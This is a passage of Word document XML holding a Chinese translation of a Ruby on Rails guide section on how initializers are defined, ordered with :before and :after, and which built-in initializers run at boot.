                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>app.config.whiny_nils</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E614243"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end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="132A44CC"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initializer</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法接受三个参数，第一个初始化程序的名字，第二个是可选项的哈希数组(这里没有显示)和第三个是一个代码块。 选项哈希数组里的 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>before</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 键可以指定为指定哪个初始化程序必须在这个初始化程序之前运行，而 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>after</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 键则指定哪个初始化程序在这个初始化程序_之后_运行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="579DFB9B"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通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>initializer</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法定义的初始化程序会按照它们被定义的顺序运行，除了那个使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:before</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或者 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:after</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62CA5DAC"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如果初始化程序运行有逻辑关系，你应该将一个初始化程序放在另一个之前或者之后。比如说有 4 个初始化程序， “one” 到 “four”(按照这个顺序定义)，并且你定义"four"在"four"_之前_ 但在"three"_之后_运行。像这种无逻辑的定义Rails将不能确定它们的顺序。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08786CB3"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rPr>
        <w:t>initializer</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法的代码块参数是应用程序自身的对象，所以我们能通过它使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法访问配置，就像在例子里做的那样。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EEEC102"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因为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails::Application</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 继承了 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails::Railtie</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (非直接)，你可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里的 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>initializer</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法去为应用程序定义初始化程序.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="786F231E" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="3"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>6.2 Initializers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AA33B58"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下面是一列所有能在 Rails 中找到的初始化程序，并按它们被定义的顺序排列 (也是它们运行的顺序，除非有其它设定)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43288C24"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load_environment_hook</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 作为一个占位器，所以让 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:load_environment_config</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 可以被定义在这之前运行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05950D82"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load_active_support</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 导入 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>active_support/dependencies</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为 Active Support 建立基础。如果 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.active_support.bare</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 不可确定, 也可以导入 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>active_support/all</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，这是默认的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4233F231"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preload_frameworks</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 如果 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.preload_frameworks</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或者 "可确定性的"，那么将自动地加载所有 Rails 会自动加载的依赖。一般这个配置选项是关闭的。在 Rails 里，内部的类第一次被引用的时候才会自动加载。</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:preload_frameworks</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 在初始化的时候就会一次过加载完它们。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DDF23F5"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initialize_logger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 初始化应用程序的日志类(一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActiveSupport::BufferedLogger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对象) 并且让它可以通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails.logger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 访问. 当在这个点之前插入的初始化程序还没有定义 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails.logger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的时候运行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="547345E5"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initialize_cache</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 如果 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails.cache</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 还没有设置，则通过引用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.cache_store</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的值并将其赋予 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails.cache</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来初始化。如果该对象有 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>middleware</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法，它的中间件将被插入到 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rack::Runtime</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 之前.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="654D3E80"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set_clear_dependencies_hook</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 提供一个给 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>active_record.set_dispatch_hooks</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 使用的 hook， 它会在这个初始化程序之前运行. 这个初始化程序 — 只有在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>cache_classes</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的时候运行 — 使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionDispatch::Callbacks.after</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 去除在请求中就已经被引用并来自对象层面的常量(依赖)，所以它们会在后续的请求中被重新加载。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F63AC4F"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initialize_dependency_mechanism</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 如果 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.cache_classes</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为 true, 配置 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActiveSupport::Dependencies.mechanism</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 去 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>require</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 依赖而不是 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>load</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 它们。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DD63D8D"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bootstrap_hook</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 运行所有配置了 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>before_initialize</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
